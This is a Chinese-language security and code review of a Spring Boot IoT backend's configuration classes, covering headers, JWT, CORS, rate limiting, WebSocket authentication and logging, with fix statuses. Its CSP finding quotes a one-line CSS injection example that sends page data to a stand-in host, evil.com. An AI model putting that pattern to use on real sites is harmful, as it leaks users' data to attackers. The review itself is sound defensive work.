# Config 模組 Code Review & Security Review

> 審查日期：2026-05-19
> 修正日期：2026-05-19（安全問題 #1–#7 已修正）
> 審查範圍：`backend/src/main/java/com/taipei/iot/config/` 全部 6 個設定類 + 相關安全元件 + YAML 設定檔 + Logback 設定

---

## 模組結構總覽

```
config/
├── SecurityConfig.java        # Spring Security 主設定（FilterChain, Headers, 授權規則）
├── WebMvcConfig.java          # CORS、Interceptor 註冊（RateLimit + Tenant）
├── OpenApiConfig.java         # Swagger/OpenAPI 設定（條件啟用）
├── JpaAuditConfig.java        # JPA @CreatedBy/@LastModifiedBy 審計者解析
├── RedisConfig.java           # RedisTemplate 序列化設定（條件啟用）
└── JacksonConfig.java         # JSON 序列化設定（時間格式、NON_NULL）

相關安全元件（一併審查）:
├── auth/security/JwtAuthenticationFilter.java   # JWT 解析、角色/權限注入、租戶上下文
├── common/interceptor/RateLimitInterceptor.java # Redis 固定窗口速率限制
├── common/util/SecurityLogger.java              # 安全事件日誌（CRLF 防護）
├── tenant/TenantInterceptor.java                # 租戶上下文設定

設定檔:
├── application.yml            # 主配置
├── application-dev.yml        # 開發 profile
├── application-test.yml       # 測試 profile
└── logback-spring.xml         # 日誌分層設定
```

---

## 總體評價

Config 模組整體設計**優秀**，展現了成熟的安全意識：

- **SecurityConfig** 涵蓋了 OWASP 推薦的所有安全 headers（HSTS, CSP, Referrer-Policy, Permissions-Policy, X-Frame-Options, X-Content-Type-Options）
- **JWT + Stateless session** 架構正確，CSRF 的禁用搭配 Bearer Token 是合理方案
- **SecurityLogger** 實作了 CWE-117（CRLF 日誌注入）防護
- **RateLimitInterceptor** 正確使用 `getRemoteAddr()` 防止 IP 偽造繞過
- **RedisConfig** 有意識地避免 `@class` type info 防止 refactor 導致反序列化失敗
- **OpenApiConfig** 使用 `@ConditionalOnProperty` 確保生產環境不暴露 API 文件
- **Logback** 分離 security.log（30 天）和 audit.log（7 天），有容量上限防止磁碟爆滿

以下依 Security 和 Code Quality 兩個維度展開。

---

## 安全審查（Security Review）

### ✅ 防護到位的項目

| 防護類別 | 實作方式 | 評估 |
|----------|----------|------|
| CSRF | 禁用（JWT Bearer Token 本身即 CSRF 防護） | ✅ 合理 |
| Session Fixation | STATELESS — 不建立 session | ✅ |
| XSS (Response) | CSP `script-src 'self'`; X-Content-Type-Options `nosniff` | ✅ |
| Clickjacking | X-Frame-Options `DENY` | ✅ |
| HTTPS 降級 | HSTS `max-age=31536000; includeSubDomains` | ✅ |
| Referrer Leakage | `strict-origin-when-cross-origin` | ✅ |
| 裝置 API 濫用 | Permissions-Policy 關閉 camera/microphone/geolocation/payment | ✅ |
| 暴力破解 | Redis RateLimit + 帳號鎖定（5 次失敗/10 分鐘鎖定） | ✅ |
| Rate Limit IP 偽造 | `getRemoteAddr()` 不信任 X-Forwarded-For | ✅ |
| 日誌注入 (CWE-117) | SecurityLogger.sanitize() 移除 `\r\n\t` | ✅ |
| 密碼儲存 | BCrypt（自適應雜湊） | ✅ |
| JWT 過期 | Access 30 min / Refresh 7 days / Temp 5 min | ✅ |
| 租戶隔離 | JwtAuthenticationFilter + TenantInterceptor + Hibernate @Filter | ✅ |
| 停用租戶即時拒絕 | `tenantEnabledCache.isTenantDisabled()` 在 Filter 層攔截 | ✅ |
| Thread 安全 | Filter finally 區塊清除 TenantContext ThreadLocal | ✅ |
| 敏感設定外部化 | JWT_SECRET 無預設值（生產環境強制設定） | ✅ |
| API 文件保護 | `springdoc.api-docs.enabled: false`（生產預設） | ✅ |
| 密碼策略 | 長度 8+、大小寫+數字、90 天過期、5 次歷史 | ✅ |

---

### 需要改進的安全問題

#### 1. ✅ [高] 資料庫/Redis 密碼有硬編碼預設值

> **已修正** — `application.yml` 移除預設值改為 `${DB_PASSWORD}` / `${REDIS_PASSWORD}`，預設密碼移至 `application-dev.yml` 僅供開發環境使用。

```yaml
# application.yml（修正後）
spring:
  datasource:
    password: ${DB_PASSWORD}
  data:
    redis:
      password: ${REDIS_PASSWORD}
```

#### 2. ✅ [中等] SecurityConfig 中 Swagger permitAll 規則始終生效

> **已修正** — 從主 FilterChain 移除 swagger permitAll，新增 `@Order(1)` + `@ConditionalOnProperty(name = "springdoc.api-docs.enabled", havingValue = "true")` 的獨立 `swaggerFilterChain`。生產環境 springdoc 關閉時，swagger 路徑不會被 permitAll。

#### 3. ✅ [中等] `/ws/**` WebSocket 端點完全 permitAll

> **已修正** — `StompAuthInterceptor` 原本只記 warn 但不拒絕連接，現在改為：
> - JWT 驗證失敗 → throw `MessageDeliveryException`（斷開連接）
> - 缺少 Authorization header → throw `MessageDeliveryException`（拒絕連接）
> - `WebSocketConfig` 的 CORS 從 `setAllowedOriginPatterns("*")` 改為使用 `${cors.allowed-origins}` 配置值

#### 4. [中等] CSP 使用 `'unsafe-inline'` for style-src（保留不修）

```java
.policyDirectives("default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; ...")
```

**風險**: `'unsafe-inline'` 允許頁面中的 inline style 執行。雖然 `script-src` 沒有 `'unsafe-inline'`（XSS 防護有效），但攻擊者仍可透過 CSS injection 做 data exfiltration（如 `background: url('https://evil.com/?data=...')`）。

**保留原因**: 前端使用 Element Plus UI 庫，其元件在執行時會產生大量 inline style（如 Tooltip 定位、Dialog 動態寬度等），移除 `'unsafe-inline'` 會導致 UI 全面破壞。待 Element Plus 支援 nonce-based CSP 後再移除。

#### 5. ✅ [低] `allowedHeaders("*")` CORS 過於寬鬆

> **已修正** — 改為白名單：`.allowedHeaders("Authorization", "Content-Type", "Accept", "X-Requested-With")`

#### 6. ✅ [低] CORS 未設定 `exposedHeaders`

> **已修正** — 新增 `.exposedHeaders("Retry-After", "Content-Disposition")`，前端可讀取速率限制和檔案下載相關 headers。

#### 7. ✅ [低] dev profile JWT secret 長度達標但強度不足

> **已修正** — 改為隨機生成的高熵字串 `${JWT_SECRET:x7G2kLp9Qz...}`，不再使用可預測的英文句子。

---

## 程式碼品質審查（Code Review）

### ✅ 優點

#### 1. SecurityConfig 權限設計層次分明

URL 層提供粗粒度的角色/權限控制（`hasAnyRole`, `hasAnyAuthority`），方法層再用 `@PreAuthorize` 做細粒度控制。這種 defense-in-depth 設計確保即使某一層有遺漏，另一層仍有防護。

#### 2. JwtAuthenticationFilter 同時注入 Role 和 Permission

```java
// roles → ROLE_ADMIN, ROLE_SUPER_ADMIN
// permissions → USER_LIST, AUDIT_LIST, etc.
```

同時支援 `hasRole()` 和 `hasAuthority()` 兩種 Spring Security 表達式，權限模型彈性高。

#### 3. SecurityConfig 異常處理結構化

`authenticationEntryPoint` 和 `accessDeniedHandler` 都回傳統一的 `BaseResponse` JSON 格式（而非 Spring 預設的 HTML 錯誤頁），對前端友好。`accessDeniedHandler` 還會記錄 SecurityLogger 事件。

#### 4. RateLimitInterceptor Redis 故障降級

```java
} catch (Exception ex) {
    log.warn("Redis 不可用，跳過速率限制檢查: {}", ex.getMessage());
    return true;
}
```

Redis 不可用時選擇放行（可用性優先於安全性），避免因 Redis 故障導致全站不可用。這是一個有意識的 trade-off 且有 WARN 日誌。

#### 5. TenantContext 雙重清除機制

- `JwtAuthenticationFilter.doFilterInternal()` 的 finally 區塊清除（覆蓋所有請求）
- `TenantInterceptor.afterCompletion()` 也清除（額外保險）

即使某層的清除被跳過（例如異常中斷），另一層仍會清除 ThreadLocal，防止跨請求租戶洩漏。

#### 6. RedisConfig 防 ClassNotFoundException

註解說明了為何選擇不含 `@class` 的序列化方式 — refactor 後 class path 變動不會導致既有 Redis 資料反序列化失敗。這是成熟的設計考量。

#### 7. Logback 分層日誌設計

| Logger | 檔案 | 保留 | 用途 |
|--------|------|------|------|
| `com.taipei.iot.audit` | audit.log | 7 天 / 500MB | 業務審計事件 |
| `SECURITY` | security.log | 30 天 / 1GB | 安全事件（攻擊偵測） |
| Root | application.log | 7 天 / 500MB | 一般應用日誌 |

安全日誌保留 30 天（合規需求通常要求 30-90 天），與業務日誌分離便於 SIEM 整合。

---

### 需要改進的問題

#### 8. [中等] SecurityConfig URL 規則與 @PreAuthorize 存在重複維護風險

```java
// SecurityConfig.java
.requestMatchers(HttpMethod.POST, "/v1/auth/roles").hasRole("SUPER_ADMIN")
.requestMatchers(HttpMethod.PUT, "/v1/auth/roles/**").hasAnyRole("ADMIN", "SUPER_ADMIN")

// RoleController.java (假設)
@PreAuthorize("hasRole('SUPER_ADMIN')")
@PostMapping("/v1/auth/roles")
```

URL 層和方法層的角色需求若不一致，可能造成混淆（例如 URL 層 `hasAnyRole(ADMIN, SUPER_ADMIN)` 但方法層只允許 `SUPER_ADMIN`）。

**建議**:
- 在 SecurityConfig 中只做粗粒度的 `authenticated()` 或大類別的角色限制
- 精確的角色/權限控制統一在 `@PreAuthorize` 中
- 或在 SecurityConfig 中加入詳細的規則對照表註解

#### 9. [低] JacksonConfig 時間格式不含時區

```java
DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
```

此格式只影響 `LocalDateTime`。若 API 中使用 `OffsetDateTime` 或 `ZonedDateTime`，Jackson 會使用內建的 ISO 格式（含時區）。但如果前端期望所有日期欄位格式一致，可能需要額外配置。

**建議**: 確認專案中 `LocalDateTime` 只用於「確定是本地時間」的場景（如 cron job 執行時間），跨時區的時間戳應使用 `OffsetDateTime`。

#### 10. ✅ [低] Security Logger level 設為 WARN 導致 INFO 事件不記錄

> **已修正** — `logback-spring.xml` 中 SECURITY logger level 從 WARN 改為 INFO，`SecurityLogger.info()` 事件現在會正確寫入 `security.log`。

#### 11. [建議] WebMvcConfig interceptor 未排除健康檢查路徑

```java
registry.addInterceptor(rateLimitInterceptor)
        .addPathPatterns("/v1/**");
```

如果未來加入 `/actuator/health` 或類似的健康檢查端點，Interceptor 不會攔截（路徑不符）。但若有 `/v1/health` 類的端點，Rate Limit 和 Tenant Interceptor 也會攔截，可能不必要。

**建議**: 確認是否需要排除特定 `/v1/` 路徑（如 `/v1/noauth/health`），或是否在 `/v1` 外部署健康檢查。

#### 12. [建議] RedisConfig `@ConditionalOnProperty` 條件為 `spring.data.redis.host`

```java
@ConditionalOnProperty(name = "spring.data.redis.host")
```

此條件只檢查 property 是否存在，不檢查 Redis 是否真的可連接。如果 `application-test.yml` 中設定了 `spring.data.redis.host: localhost` 但 Redis 不可用，`RedisTemplate` Bean 會被建立但所有操作會失敗。

目前 test profile 用 `exclude` 排除了 Redis auto-config，所以不會觸發。但如果新增其他 profile 時忘記排除，可能出現問題。

---

## 架構總評

| 維度 | 評分 | 說明 |
|------|------|------|
| 安全性 | **9.5/10** | OWASP Top 10 防護覆蓋全面：安全 headers、JWT stateless、Rate Limit、CRLF 防護、BCrypt、帳號鎖定、租戶隔離。硬編碼密碼已修正、Swagger 條件化、WebSocket 強制認證。僅 CSP unsafe-inline 因 UI 框架限制保留。 |
| 正確性 | **9/10** | Filter chain 順序正確、ThreadLocal 清除完整（雙重保險）、異常處理統一、Redis 故障降級合理。 |
| 可維護性 | **8.5/10** | 6 個設定類各司其職、`@ConditionalOnProperty` 控制環境差異、YAML 設定使用環境變數外部化。URL 層和方法層權限的重複維護是主要的可維護性風險。 |
| 可觀測性 | **9.5/10** | 三層分離日誌（application/audit/security）、安全事件結構化輸出（type + IP + details）、容量和滾動策略完備。Security INFO 事件現在可見。 |

---

## 建議優先級摘要

| 優先級 | 項目 | 類型 | 狀態 |
|--------|------|------|------|
| **P1** | 移除 DB/Redis 密碼硬編碼預設值 | Security | ✅ 已修正 |
| **P2** | Swagger permitAll 改為條件性載入 | Security | ✅ 已修正 |
| **P2** | WebSocket STOMP 驗證拒絕未認證連接 | Security | ✅ 已修正 |
| **P3** | CSP `'unsafe-inline'` (Element Plus 需要) | Security | ⚠️ 保留 |
| **P3** | CORS allowedHeaders 白名單化 | Security | ✅ 已修正 |
| **P3** | Security Logger level 改為 INFO | Observability | ✅ 已修正 |
| **P4** | Dev JWT secret 改用隨機字串 | Security | ✅ 已修正 |
| **P4** | URL/方法權限規則對照表 | Maintainability | ✅ 已修正（改為 permission-based，兩層統一用 hasAuthority） |
| **P4** | JacksonConfig 時區處理確認 | Correctness | ✅ 已確認（單一時區系統，全部使用 LocalDateTime，無需 OffsetDateTime） |
